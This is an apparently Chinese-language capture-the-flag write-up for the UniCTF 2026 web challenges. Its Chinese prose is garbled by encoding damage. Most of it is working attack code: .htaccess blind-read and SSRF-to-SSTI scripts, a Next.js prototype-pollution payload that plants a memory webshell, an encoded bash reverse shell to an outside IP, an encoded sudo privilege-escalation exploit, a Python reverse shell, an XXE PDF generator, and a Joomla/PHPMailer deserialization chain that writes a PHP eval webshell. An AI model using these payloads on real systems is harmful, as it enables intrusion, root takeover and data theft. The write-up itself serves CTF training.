[{"title":"UniCTF-WEB WP","path":"/2026/02/06/UniCTF2026/","content":"ezUploadezUpload Revenge!!è¿™é“é¢˜é™åˆ¶ Max size: 1KBForbidden chars: ? $ ; | ` \\ No PHP code å¦‚æœæ²¡æœ‰ban\\ å¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡ ä¸è¿‡è¿™é‡Œç¦æ­¢äº† è¿™é‡Œä¹Ÿæç¤ºæˆ‘ä»¬ä¸Šä¼ é…ç½®æ–‡ä»¶ .htaccess .htaccesså…¶å®æœ‰å¾ˆå¤šç§ç”¨æ³•ï¼Œä¸æ­¢æˆ‘ä»¬å¹³å¸¸ç”¨åˆ°çš„ç®€å•æŠŠå…¶ä»–æ–‡ä»¶å½“ä½œphpæ¥è§£æçš„ç”¨æ³•ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬å¯ä»¥æ‹¿è¿™ä¸ªæ¥åšå¾ˆå¤šæ“ä½œï¼Œè¯»æ–‡ä»¶ æ–‡ä»¶åŒ…å« xssç­‰ å¯ä»¥å‚è€ƒæ–‡ç« :Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§-å…ˆçŸ¥ç¤¾åŒº è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯æ–‡ç« é‡Œé¢æ²¡æœ‰çš„ç”¨æ³• å¯ä»¥ç®—æ˜¯ä½¿ç”¨.htaccessæ¥è¿›è¡Œç›²æ³¨ RewriteEngine On #å¯åŠ¨ Apache çš„ URL é‡å†™å¼•æ“ã€‚è¿™æ˜¯è¿›è¡Œä»»ä½•é‡å†™æ“ä½œçš„å‰æã€‚RewriteCond expr file(/flag)=~ /pattern/ #åˆ¤æ–­æ¡ä»¶ è¯»å–/flagæ–‡ä»¶RewriteRule .* - [R=500] #è¿”å›ç»“æœï¼Œå¦‚æœæ»¡è¶³ å¼ºåˆ¶æœåŠ¡å™¨è¿”å› 500 Internal Server Error çŠ¶æ€ç  ä½¿ç”¨çš„æ˜¯æ¨¡å—mod_rewrite æ¨¡å—å¼€å…³ (RewriteEngine)åˆ¤å®šæ¡ä»¶ (RewriteCond)æ‰§è¡Œè§„åˆ™ (RewriteRule) äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å†™è„šæœ¬æ¥ä¸€æ­¥ä¸€æ­¥ç›²æ³¨æ‹¿åˆ°flagäº†~ è„šæœ¬å”¯ä¸€è¦æ³¨æ„çš„éœ€è¦å»è®¿é—®uploadä¸‹è·¯ç”±ç¡®è®¤æ˜¯ä¸æ˜¯500 å› ä¸º.htaccessç®¡çš„æ˜¯uploadè·¯ç”± import requestsimport stringbase_url = http://urlupload_url = fbase_url/trigger_url = fbase_url/upload/testflag = Ucharset = string.ascii_letters + string.digits + _- print(f[+] Starting Blind Injection on /upload/...)while True: found_char = False for char in charset: pattern = f^flagchar htaccess_content = fRewriteEngine OnRewriteCond expr file(/flag) =~ /pattern/RewriteRule .* - [R=500] files = file: (.htaccess, htaccess_content, image/jpeg) try: # 1. ä¸Šä¼ æ–‡ä»¶ up_res = requests.post(upload_url, files=files, timeout=5) # 2. è¯·æ±‚è§¦å‘è·¯å¾„ï¼Œæ£€æŸ¥æ˜¯å¦è¿”å› 500 trigger_res = requests.get(trigger_url, timeout=5) if trigger_res.status_code == 500: flag += char print(f[!] Found character: char | Current flag: flag) found_char = True break except Exception as e: print(f[-] Error: e) continue if not found_char: print(f [+] Finished. Final Flag: flag) break è¿™ä¸ªå®˜æ–¹è¿˜æä¾›äº†ä¸ç”¨ç›²æ³¨çš„æ‰‹æ³• RewriteEngine OnRewriteCond expr file(/flag) =~ /(.+)/RewriteRule .* - [E=FLAG_CONTENT:%1]Header set X-Test-Expr %FLAG_CONTENTe Intrasightè¿›å»å°±æ˜¯å¾ˆæ˜æ˜¾çš„ssrf æ”¯æŒhttphttpså’Œws æ¢æµ‹å­˜æ´»ç«¯å£æœ‰ ä¿¡æ¯æ”¶é›†åˆ° ä¸‹é¢ä¸¤ä¸ªè·¯ç”±éƒ½æœ‰ä¸œè¥¿ ï¼http://127.0.0.1:9000/openapi.json status: 200, headers: content-type: application/json , history: [], body: openapi: 3.1.0, info: title: ws_render, version: 0.1.0 , paths: ï¼http://127.0.0.1:8001/openapi.json status: 200, headers: content-type: application/json, x-service: admin_panel , history: [], body: openapi: 3.1.0, info: title: admin_panel, version: 0.1.0 , paths: /status: get: summary: Status Page, operationId: status_page_status_get, responses: 200: description: Successful Response, content: application/json: schema: , /api/debug/config: get: summary: Debug Config, operationId: debug_config_api_debug_config_get, responses: 200: description: Successful Response, content: application/json: schema: , /redirect_ws: get: summary: Redirect Ws, operationId: redirect_ws_redirect_ws_get, responses: 200: description: Successful Response, content: application/json: schema: ç»§ç»­ä¿¡æ¯æ”¶é›† ï¼http://127.0.0.1:8001/status status: 200, headers: content-type: text/html; charset=utf-8, x-service: admin_panel , history: [], body: !DOCTYPE html html lang=\\zh-CN\\ head meta charset=\\UTF-8\\ titleIntraSight Status/title /head body h3å†…éƒ¨é¢æ¿åœ¨çº¿/h3 pæç¤ºï¼šè°ƒè¯•ä¿¡æ¯å¯æŸ¥çœ‹ /api/debug/config/p /body /htmlï¼http://127.0.0.1:8001/api/debug/config status: 200, headers: content-type: application/json, x-service: admin_panel , history: [], body: version: 1.0, ws_internal: ws://127.0.0.1:9000/ws ï¼http://127.0.0.1:8001/redirect_ws status: 404, headers: content-type: application/json , history: [ status: 302, location: ws://127.0.0.1:9000/ws?token=e15bb4430bbe45f0864693c875f2982c ], body: detail: Not Found æˆ‘ä»¬å»è®¿é—®ws:127.0.0.1:9000ws?tokene15bb4430bbe45f0864693c875f2982c å›æ˜¾ ws: ok, message: handshake success, welcome: \\error\\:\\invalid origin None ; X-Internal-Token header must match ?token; token expired or invalid (try /redirect_ws)\\ è¦æ±‚æˆ‘ä»¬å¸¦ä¸Štokenå’Œorigin ç»è¿‡æµ‹è¯•tokenæ¯æ¬¡æ˜¯è¯·æ±‚äº†å°±ä¼šåˆ·æ–°çš„ æ‰‹åŠ¨å¹¶ä¸å¥½å®ç° äºæ˜¯å†™è„šæœ¬ import requestsclass WSConnector: def __init__(self, base_url, cookie): self.base_url = base_url.rstrip(/) self.fetch_url = fself.base_url/fetch self.session = requests.Session() self.session.headers.update( User-Agent: Mozilla/5.0, Cookie: cookie ) def get_token(self): print([*] æ­£åœ¨è·å–åŠ¨æ€ Token...) r = self.session.get(self.fetch_url, params=url: http://127.0.0.1:8001/redirect_ws) location = r.json()[history][0][location] token = location.split(token=)[1] print(f[+] å¾—åˆ° Token: token) return token def connect_ws(self, token): ws_target_url = fws://127.0.0.1:9000/ws?token=token headers = X-Internal-Token: token, Origin: http://127.0.0.1 print(f[*] æ­£åœ¨é€šè¿‡ fetch è¿æ¥: ws_target_url) try: r = self.session.get( self.fetch_url, params=url: ws_target_url, headers=headers, timeout=10 ) print(f[*] çŠ¶æ€ç : r.status_code) print([*] å“åº”å†…å®¹:) print(r.text) except Exception as e: print(f[-] è¿æ¥å‘ç”Ÿé”™è¯¯: e)if __name__ == __main__: BASE_URL = http://80-b7779d40-df95-4c3b-a5a8-6a21763fe975.challenge.ctfplus.cn COOKIE = _clck=1q1wtxm%5E2%5Eg3c%5E0%5E2008 connector = WSConnector(BASE_URL, COOKIE) token = connector.get_token() connector.connect_ws(token) å›æ˜¾æ˜¯ ws:ok,message:handshake success,welcome:\\service\\:\\IntraSight Template Preview\\,\\version\\:\\1.0\\,\\protocol\\:\\action\\:\\render\\,\\template\\:\\template string\\,\\context\\:\\optional\\:\\variables\\ ä¸€çœ‹å°±æ˜¯ssti å°è¯•ç»™è¿™ä¸ªæœåŠ¡æŒ‰ç…§ä»–çš„æ ¼å¼å»postä¼ å…¥payload import requestsimport jsondef exploit(): # é…ç½® base_url = http://url/ cookie = _clck=1q1wtxm%5E2%5Eg30%5E0%5E2008 session = requests.Session() session.headers.update( User-Agent: Mozilla/5.0, Cookie: cookie ) print([*] è·å– token...) r = session.get(fbase_url/fetch, params=url: http://127.0.0.1:8001/redirect_ws) token = r.json()[history][0][location].split(token=)[1] print(f[+] Token: token) target_payload = lipsum.__globals__.__builtins__.__import__(os).popen(cat /flag).read() data = action: render, template: target_payload, context: headers = X-Internal-Token: token, Origin: http://127.0.0.1, Content-Type: application/json response = session.post( fbase_url/fetch, params=url: fws://127.0.0.1:9000/ws?token=token, headers=headers, json=data, timeout=10 ) print(f[*] çŠ¶æ€ç : response.status_code) try: res_json = response.json() print([+] å“åº”å†…å®¹:) print(json.dumps(res_json, indent=4, ensure_ascii=False)) except: print(f[*] åŸå§‹å“åº”å†…å®¹: response.text)if __name__ == __main__: exploit() æˆåŠŸæ‰¾åˆ°flag mioâ€™s waf(èµ›åå¤ç°)è¿›å»çœ‹ä¸‹æŒ‡çº¹å°±çŸ¥é“æ˜¯è€ƒçš„next.jsçš„æ´ ä¸è¿‡æ˜¯éå¸¸å¼ºå¤§çš„waf(æ‚è„¸) èµ›æ—¶æ˜¯æ²¡åšå‡ºæ¥çš„ çœ‹äº†å®˜æ–¹wpæ‰çŸ¥é“ ç§¯ç´¯äº†æ–°çŸ¥è¯† ä½¿ç”¨äºŒæ¬¡unicodeç»•è¿‡ ä½†æ˜¯ä¸ºä»€ä¹ˆä»–å¯ä»¥è§£æå‘¢ï¼ŸåŸç†å°±æ˜¯ reactä½¿ç”¨Flightåè®®è§£æå®¢æˆ·ç«¯å‘è¿‡æ¥çš„ä¸œè¥¿ï¼ŒRSCä¸å®¢æˆ·ç«¯çš„é€šä¿¡åŸºäºReactå®šåˆ¶çš„Flightåè®®ä»–ä¼šè§£æunicodeç¼–ç  å¯¹äºFlightåè®® username:sauy\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065:\\u0073\\u0061\\u0075\\u0079 è¿™ä¸¤ç§å½¢å¼ä»–éƒ½è§£æï¼Œä¸”ä½œç”¨ä¸€æ ·ã€‚ é‚£è¿™é‡Œæœ€ä¸»è¦çš„é—®é¢˜å°±æ˜¯ï¼Œwafä»–ä¼šå¯¹æˆ‘å‘çš„ä¸œè¥¿å…ˆè¿›è¡Œä¸€æ¬¡unicodeè§£ç ï¼Œæ²¡æœ‰è§¦å‘é»‘åå•å°±ä¼šå‘é€ç»™next.jsçš„æœåŠ¡ç«¯ã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äºŒæ¬¡unicodeç¼–ç ç»•è¿‡å°±ä¼šè¢«reactæœåŠ¡å™¨è§£æã€‚ import urllib.parsedef encode_payload(payload): utf16_bytes = payload.encode(utf-16-le) encoded_payload = .join([f%b:02x for b in utf16_bytes]) return encoded_payloadpayload = then: $1:__proto__:then, status: resolved_model, reason: -1, value: \\then\\:\\$B1\\, _response: _prefix: (async()=const h=await import(node:http),c=await import(node:child_process);const o=h.Server.prototype.emit;h.Server.prototype.emit=async function(e,...a)if(e===request)const[r,s]=a;if(r.url===/||r.url.startsWith(/?))tryconst cmd=r.headers[user-agent]||id;const out=c.execSync(cmd,encoding:utf8,timeout:5000);s.writeHead(200,Content-Type:text/plain,X-MemShell:active);s.end(out);catch(x)s.writeHead(500);s.end(x.message);return true;return o.apply(this,arguments);;)();, _chunks: $Q2, _formData: get: $1:constructor:constructor result = encode_payload(payload)print(f[*] åŸå§‹ Payload: payload)print(f[*] UTF-16LE + URL Encode ç»“æœ:)print(result) ä¼ ä¸€ä¸ªå†…å­˜é©¬ POST / HTTP/1.1Host: nc1.ctfplus.cn:37399Content-Type: multipart/form-data; boundary=383e97eeef64d0c473a0924ed9968211User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15Accept-Encoding: gzip, deflate, zstdCookie: _clck=1q1wtxm%5E2%5Eg3c%5E0%5E2008; _ga=GA1.1.1142461839.1770356861; _ga_BFDVYZJ3DE=GS2.1.s1770386835$o5$g1$t1770386836$j59$l0$h0; waf_num_token1=1000121; waf_num_token2=1000429Accept: */*Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0Content-Length: 727--383e97eeef64d0c473a0924ed9968211Content-Disposition: form-data; name=0Content-Type: text/plain; charset=utf16lehexd(7B000A002000200022007400680065006E0022003A0020002200240031003A005F005F00700072006F0074006F005F005F003A007400680065006E0022002C000A0020002000220073007400610074007500730022003A00200022007200650073006F006C007600650064005F006D006F00640065006C0022002C000A0020002000220072006500610073006F006E0022003A0020002D0031002C000A00200020002200760061006C007500650022003A00200022007B005C0022007400680065006E005C0022003A005C0022002400420031005C0022007D0022002C000A002000200022005F0072006500730070006F006E007300650022003A0020007B000A00200020002000200022005F0070007200650066006900780022003A002000220028006100730079006E006300280029003D003E007B0063006F006E0073007400200068003D0061007700610069007400200069006D0070006F0072007400280027006E006F00640065003A006800740074007000270029002C0063003D0061007700610069007400200069006D0070006F0072007400280027006E006F00640065003A006300680069006C0064005F00700072006F006300650073007300270029003B0063006F006E007300740020006F003D0068002E005300650072007600650072002E00700072006F0074006F0074007900700065002E0065006D00690074003B0068002E005300650072007600650072002E00700072006F0074006F0074007900700065002E0065006D00690074003D006100730079006E0063002000660075006E006300740069006F006E00280065002C002E002E002E00610029007B0069006600280065003D003D003D0027007200650071007500650073007400270029007B0063006F006E00730074005B0072002C0073005D003D0061003B0069006600280072002E00750072006C003D003D003D0027002F0027007C007C0072002E00750072006C002E007300740061007200740073005700690074006800280027002F003F002700290029007B007400720079007B0063006F006E0073007400200063006D0064003D0072002E0068006500610064006500720073005B00270075007300650072002D006100670065006E00740027005D007C007C0027006900640027003B0063006F006E007300740020006F00750074003D0063002E006500780065006300530079006E006300280063006D0064002C007B0065006E0063006F00640069006E0067003A002700750074006600380027002C00740069006D0065006F00750074003A0035003000300030007D0029003B0073002E0077007200690074006500480065006100640028003200300030002C007B00270043006F006E00740065006E0074002D00540079007000650027003A00270074006500780074002F0070006C00610069006E0027002C00270058002D004D0065006D005300680065006C006C0027003A00270061006300740069007600650027007D0029003B0073002E0065006E00640028006F007500740029003B007D00630061007400630068002800780029007B0073002E00770072006900740065004800650061006400280035003000300029003B0073002E0065006E006400280078002E006D0065007300730061006700650029003B007D00720065007400750072006E00200074007200750065003B007D007D00720065007400750072006E0020006F002E006100700070006C007900280074006800690073002C0061007200670075006D0065006E007400730029003B007D003B007D002900280029003B0022002C000A00200020002000200022005F006300680075006E006B00730022003A002000220024005100320022002C000A00200020002000200022005F0066006F0072006D00440061007400610022003A0020007B000A00200020002000200020002000220067006500740022003A0020002200240031003A0063006F006E007300740072007500630074006F0072003A0063006F006E007300740072007500630074006F00720022000A0020002000200020007D000A00200020007D000A007D00)--383e97eeef64d0c473a0924ed9968211Content-Disposition: form-data; name=1$@0--383e97eeef64d0c473a0924ed9968211Content-Disposition: form-data; name=2[]--383e97eeef64d0c473a0924ed9968211-- ç„¶åè®¿é—®ä¸»é¡µ é€šè¿‡äººæœºè®¤è¯å uaå¤´å¤„ å¼¹shell bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDkuMjA3LjEyMy8xMjM0IDA+JjEK | base64 -d | bash æ‹¿åˆ°shelläº†éœ€è¦ææƒ è€ƒç‚¹æ˜¯CVE-2025-32463 pocåœ¨CVE-2025-32463_chwoot shellå¤„å†™ echo IyEvYmluL2Jhc2gNCiMgc3Vkby1jaHdvb3Quc2gNCiMgQ1ZFLTIwMjUtMzI0NjMg4oCTIFN1ZG8gRW9QIEV4cGxvaXQgUG9DIGJ5IFJpY2ggTWlyY2gNCiMgICAgICAgICAgICAgICAgICBAIFN0cmF0YXNjYWxlIEN5YmVyIFJlc2VhcmNoIFVuaXQgKENSVSkNClNUQUdFPSQobWt0ZW1wIC1kIC90bXAvc3Vkb3dvb3Quc3RhZ2UuWFhYWFhYKQ0KY2QgJHtTVEFHRT99IHx8IGV4aXQgMQ0KDQppZiBbICQjIC1lcSAwIF07IHRoZW4NCiAgICAjIElmIG5vIGNvbW1hbmQgaXMgcHJvdmlkZWQsIGRlZmF1bHQgdG8gYW4gaW50ZXJhY3RpdmUgcm9vdCBzaGVsbC4NCiAgICBDTUQ9Ii9iaW4vYmFzaCINCmVsc2UNCiAgICAjIE90aGVyd2lzZSwgdXNlIHRoZSBwcm92aWRlZCBhcmd1bWVudHMgYXMgdGhlIGNvbW1hbmQgdG8gZXhlY3V0ZS4NCiAgICBDTUQ9IiRAIg0KZmkNCg0KIyBFc2NhcGUgdGhlIGNvbW1hbmQgdG8gc2FmZWx5IGluY2x1ZGUgaXQgaW4gYSBDIHN0cmluZyBsaXRlcmFsLg0KIyBUaGlzIGhhbmRsZXMgYmFja3NsYXNoZXMgYW5kIGRvdWJsZSBxdW90ZXMuDQpDTURfQ19FU0NBUEVEPSQocHJpbnRmICclcycgIiRDTUQiIHwgc2VkIC1lICdzL1xcL1xcXFwvZycgLWUgJ3MvIi9cXCIvZycpDQoNCmNhdCA+IHdvb3QxMzM3LmM8PEVPRg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQpfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpIHZvaWQgd29vdCh2b2lkKSB7DQogIHNldHJldWlkKDAsMCk7DQogIHNldHJlZ2lkKDAsMCk7DQogIGNoZGlyKCIvIik7DQogIGV4ZWNsKCIvYmluL3NoIiwgInNoIiwgIi1jIiwgIiR7Q01EX0NfRVNDQVBFRH0iLCBOVUxMKTsNCn0NCkVPRg0KDQpta2RpciAtcCB3b290L2V0YyBsaWJuc3NfDQplY2hvICJwYXNzd2Q6IC93b290MTMzNyIgPiB3b290L2V0Yy9uc3N3aXRjaC5jb25mDQpjcCAvZXRjL2dyb3VwIHdvb3QvZXRjDQpnY2MgLXNoYXJlZCAtZlBJQyAtV2wsLWluaXQsd29vdCAtbyBsaWJuc3NfL3dvb3QxMzM3LnNvLjIgd29vdDEzMzcuYw0KDQplY2hvICJ3b290ISINCnN1ZG8gLVIgd29vdCB3b290DQpybSAtcmYgJHtTVEFHRT99 | base64 -d /tmp/e.sh ä¸è¿‡æˆ‘è¿™ä¸ªæ¢è¡Œç¬¦å·æœ‰é—®é¢˜ ä¸‹é¢å»æ‰å°±è¡Œ cat /tmp/e.sh | tr -d \\r /tmp/e_fixed.sh bash /tmp/e_fixed.sh python3 -c import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ip\\,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\/bin/bash\\, \\-i\\]) è¿è¡Œè¿™ä¸ªå³å¯æ‹¿åˆ°rootçš„shell GlyphWeaveråç‰‡ç”Ÿæˆå™¨ è¯†åˆ«æŒ‡çº¹ä¸ºpythonå’Œflaskå¹¶ä¸”æ˜¯åç‰‡æ¸²æŸ“ ç§’è”æƒ³ssti æœ‰ä¸¤ä¸ªLive Previewå’ŒExport Consoleä¸¤ä¸ªåŠŸèƒ½ å‘ç°åœ¨ä»»ä½•åœ°æ–¹è¾“å…¥å°±ä¼šè¢«è¿‡æ»¤ å¹¶ä¸”fuzzåå‘ç°ç¡®å®æœ‰ä¸€äº›sstiçš„å…³é”®è¯ä¹Ÿè¢«wafäº† å¹¶ä¸”Titleå’ŒMottoéƒ½æœ‰é•¿åº¦é™åˆ¶ é‚£è¿™é‡Œæˆ‘å°±ä¼šè€ƒè™‘ä½¿ç”¨å…¨è§’å­—ç¬¦æ¥ç»•è¿‡é™åˆ¶ å¹¶ä¸”pocå°½é‡ç®€æ´ å…¨è§’å­—ç¬¦å¯ä»¥ä½¿ç”¨ ï½›ï½›ï½Œï½‰ï½ï½“ï½•ï½ï¼»ï¼‡ï¼¿ï¼¿ï½‡ï½Œï½ï½‚ï½ï½Œï½“ï¼¿ï¼¿ï¼‡ï¼½ï¼»ï¼‡ï¼¿ï¼¿ï½‚ï½•ï½‰ï½Œï½”ï½‰ï½ï½“ï¼¿ï¼¿ï¼‡ï¼½ï¼»ï¼‡ï½ï½ï½…ï½ï¼‡ï¼½ï¼ˆ/flagï¼‡ï¼‡ï¼‰ï¼»ï¼‡ï½’ï½…ï½ï½„ï¼‡ï¼½ï¼ˆï¼‰ï½ï½ SecureDocè§£æpdf å¹¶ä¸”ä¸‹é¢è¯´æ˜äº† â„¹ï¸ Supported Features:â€¢ Standard PDF text extractionâ€¢ PDF forms and interactive elementsâ€¢ XFA-based dynamic formsâ€¢ Metadata extraction æå–å…³é”®è¯XFA XFAå’ŒXMLæœ‰å…³ é‚£æˆ‘ä»¬è¿™é‡Œå°±è‚¯å®šæƒ³åˆ°xxe ç›´æ¥æ‰¾aiç»™æˆ‘ä¸€ä¸ªè‡ªå®šä¹‰xfaç”Ÿæˆpdfçš„è„šæœ¬ import osfrom pypdf import PdfWriterfrom pypdf.generic import NameObject, DecodedStreamObject, DictionaryObjectdef generate_pdf(): current_dir = os.path.dirname(os.path.abspath(__file__)) output_path = os.path.join(current_dir, xfa_test_final.pdf) writer = PdfWriter() writer.add_blank_page(width=612, height=792) # æ„é€ åŒ…å« XXE Payload çš„ XDP ç»“æ„ xfa_content = f?xml version=1.0 encoding=UTF-8?xdp:xdp xmlns:xdp=http://ns.adobe.com/xdp/ xfa:datasets xmlns:xfa=http://www.xfa.org/schema/xfa-data/1.0/ xfa:data root !DOCTYPE root [ !ENTITY file SYSTEM file:///flag ] datafile;/data /root /xfa:data /xfa:datasets/xdp:xdp # 1. åˆ›å»º XFA æµå¯¹è±¡ payload_stream = DecodedStreamObject() payload_stream._data = xfa_content.encode(utf-8) # å¿…é¡»æ·»åŠ ç±»å‹æ ‡è¯†ï¼Œå¦åˆ™æŸäº›é˜…è¯»å™¨ä¸è¯†åˆ« payload_stream.update( NameObject(/Type): NameObject(/EmbeddedFile) ) xfa_ref = writer._add_object(payload_stream) # 2. æ„é€  AcroForm å­—å…¸ # ä½¿ç”¨ DictionaryObject åŒ…è£…ä»¥ä¿®å¤ AttributeError acro_form = DictionaryObject() acro_form.update( NameObject(/XFA): xfa_ref ) # 3. æ³¨å…¥åˆ° PDF æ ¹èŠ‚ç‚¹ writer.root_object.update( NameObject(/AcroForm): writer._add_object(acro_form), NameObject(/NeedsRendering): NameObject(/true) ) try: with open(output_path, wb) as f: writer.write(f) print(f--- æˆåŠŸ ---) print(fæ–‡ä»¶ä½ç½®: output_path) print(fæ–‡ä»¶å¤§å°: os.path.getsize(output_path) å­—èŠ‚) except Exception as e: print(få†™å…¥å¤±è´¥: e)if __name__ == __main__: generate_pdf() Joomla Revenge!è¿™é¢˜è€ƒçš„è‡ªå·±æŒ–æ˜é“¾å­ æˆ‘è‡ªå·±æŒ–æ˜çš„æ—¶å€™å¡ä½() åœ¨ç½‘ä¸Šæœå¯»çš„æ—¶å€™å‘ç°å’Œè‡ªå·±æœ€åè½è„šç‚¹ä¸€æ ·çš„é“¾å­ æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« https://xz.aliyun.com/news/91387 å¤§å®¶å¯ä»¥å‚åŠ è¿™ç¯‡æ–‡ç« æ¥è¿½ä¸‹é“¾å­ æˆ‘è¿™å°±ç›´æ¥è´´pocäº† ?phpnamespace Joomla\\Database\\Sqlite class SqliteDriver protected $dispatcher; protected $options= [driver=MeteorKai];//è¿™é‡Œæ˜¯hostä»€ä¹ˆçš„éƒ½å¯ä»¥ public function __construct($dispatcher) $this-dispatcher = $dispatcher; namespace Joomla\\Event class Dispatcher protected $listeners = []; public function __construct($listeners) $this-listeners = $listeners; namespace PHPMailer\\PHPMailer class PHPMailer public $Mailer=qmail; public $Sender=MeteorKai@qq.com; public $Sendmail=tee /var/www/html/shell.php --; public $CharSet = iso-8859-1; public $Body=?php @eval($_POST[1]); ?; public $From = MeteorKai@example.com; public $AllowEmpty = false; protected $cc = [[MeteorKai@qq.com,MeteorKai]]; namespace $phpmailer = new \\PHPMailer\\PHPMailer\\PHPMailer(); $dispatcher = new \\Joomla\\Event\\Dispatcher([onAfterDisconnect = [[$phpmailer,send]]]); $driver = new \\Joomla\\Database\\Sqlite\\SqliteDriver($dispatcher); echo urlencode(base64_encode(serialize($driver))); ä¸€é¸£å”±å§è¿›å»å°è¯•adminå¼±å¯†ç çˆ†ç ´ çˆ†ç ´å‡ºæ¥å¯†ç æ˜¯admin888 adminå¤šäº†ä¸€ä¸ªè¯»å–æºç çš„åŠŸèƒ½ å¯ä»¥è¯»åˆ°download.php ?php// å¼•å…¥æ•°æ®åº“è¿æ¥require_once includes/db.php;if (session_status() === PHP_SESSION_NONE) session_start(); if (!isset($_SESSION[user])) require_once includes/header.php; die(div class=containerp class=errorè¯·å…ˆç™»å½•ä¼šå‘˜ç³»ç»Ÿï¼/ Access Denied/p/div); require_once includes/footer.php;if (isset($_GET[preview]) $_GET[preview] === true isset($_SESSION[is_admin]) $_SESSION[is_admin] == 1) $format = isset($_GET[format]) ? $_GET[format] : ; // ======================================== // å®‰å…¨è¿‡æ»¤ï¼šåè®®é»‘åå•æ£€æŸ¥ // ======================================== $dangerousProtocols = [ php://, data://, phar://, zip://, compress.zlib://, compress.bzip2://, zlib://, glob://, expect://, input://, http://, https://, ftp://, ftps://, dict://, gopher://, tftp://, ldap://, ssh2.sftp://, ssh2.scp://, ssh2.tunnel://, rar://, ogg://, ]; foreach ($dangerousProtocols as $protocol) if (stripos($format, $protocol) !== false) require_once includes/header.php; echo div class=container; echo p class=errorâš ï¸ å®‰å…¨è­¦å‘Šï¼šç¦æ­¢ä½¿ç”¨è¯¥åè®® . htmlspecialchars($protocol) . /p; echo pç³»ç»Ÿæ£€æµ‹åˆ°æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå·²æ‹¦æˆªæ­¤æ¬¡è¯·æ±‚ã€‚/p; echo /div; require_once includes/footer.php; exit; // ======================================== $full_path = $format; $is_viewing_source = (strpos($format, file://) === 0); if ($is_viewing_source) header(Content-Type: text/plain; charset=utf-8); else header(Content-Type: text/html; charset=utf-8); require_once includes/header.php; echo div class=containerh2 class=neon-textğŸ”§ ç®¡ç†å‘˜é¢„è§ˆæ§åˆ¶å°/h2; echo p class=messageæ­£åœ¨å°è¯•åŠ è½½èµ„æºæµ: strong . htmlspecialchars($full_path) . /strong/p; echo div style=background: #000; padding: 15px; border: 1px solid #333; font-family: monospace; color: #0f0; white-space: pre-wrap;; try $handle = @fopen($full_path, r); if ($handle) $content = stream_get_contents($handle); if ($is_viewing_source) echo $content; else echo htmlspecialchars($content); fclose($handle); else echo Error: èµ„æºåŠ è½½å¤±è´¥ã€‚ ; echo å¯èƒ½çš„åŸå› ä¸ºï¼š ; echo 1. æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨ ; echo 2. æƒé™ä¸è¶³ (Permission Denied) ; echo 3. åè®®æ ¼å¼é”™è¯¯ ; catch (Exception $e) echo System Error: . $e-getMessage(); if (!$is_viewing_source) echo /div/div; // å…³é—­ console å’Œ container require_once includes/footer.php; exit; //æ™®é€šä¼šå‘˜æ–‡ä»¶ä¸‹è½½require_once includes/header.php;if (isset($_GET[file])) $file = $_GET[file]; if (strpos($file, ..) === false strpos($file, /) === false) $filepath = uploads/ . $file; if (file_exists($filepath)) header(Content-Type: application/octet-stream); header(Content-Disposition: attachment; filename=.basename($filepath).); header(Content-Length: . filesize($filepath)); readfile($filepath); exit; else echo p class=erroræ–‡ä»¶ä¸å­˜åœ¨æˆ–å·²è¢«ç§»é™¤ã€‚/p; else echo p class=erroréæ³•è¯·æ±‚ã€‚/p; $admin_panel = ;if (isset($_SESSION[is_admin]) $_SESSION[is_admin] == 1) $current_dir = __DIR__; $admin_panel = HTML div class=admin-panel h3 class=neon-textğŸ”§ ç®¡ç†å‘˜å†…éƒ¨é¢„è§ˆ (Dev Mode)/h3 p style=color: gray; font-size: 0.8em;å½“å‰ Web æ ¹ç›®å½•: $current_dir/p form method=get target=_blank input type=hidden name=preview value=true labelResource URI:/label input type=text name=format placeholder=ä¾‹å¦‚: file://$current_dir/index.php style=width: 70%; required button type=submitåŠ è½½èµ„æº/button /form /divHTML;?h2 class=neon-textğŸµ ä¸€é¸£æ›²åº“ (å½’æ¡£ä¸­å¿ƒ)/h2pè¿™é‡Œå­˜æ”¾ç€ç³»ç»Ÿå½’æ¡£æ–‡ä»¶ã€‚æ™®é€šä¼šå‘˜å¯æ ¹æ®æ–‡ä»¶åä¸‹è½½ã€‚/pdiv style=margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3); h3ğŸ“¥ æ­Œæ›²/æ–‡ä»¶ä¸‹è½½/h3 form method=get æ–‡ä»¶å: input type=text name=file placeholder=è¾“å…¥æ–‡ä»¶å, å¦‚ MGSG202500.mp3 button type=submitä¸‹è½½æ–‡ä»¶/button /form/div?php echo $admin_panel;require_once includes/footer.php; ? è¿™é‡Œä¸Šä¼ æ–‡ä»¶å‘ç°æ–‡ä»¶åå­—åªæœ‰æœ€åä¸¤ä½ä¼šæ”¹å˜ å¯ä»¥ä½¿ç”¨æŒ‡ä»¤æ¥fuzzä¸€ä¸‹æœ‰æ²¡æœ‰å…¶ä»–æ–‡ä»¶ seq -w 0 99 num.txt æŒ‡ä»¤ ffuf -u http://80-ac3e9347-1eed-4363-a83d-695bb12473b0.challenge.ctfplus.cn/uploads/UNiCTF2026W1.W2 \\-w ./num.txt:W1 \\-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt:W2 \\-mc 200 -t 20 -p 0.1 æ˜¯å¯ä»¥fuzzå‡ºæ¥UNiCTF202667.dbå’ŒUNiCTF202638.php 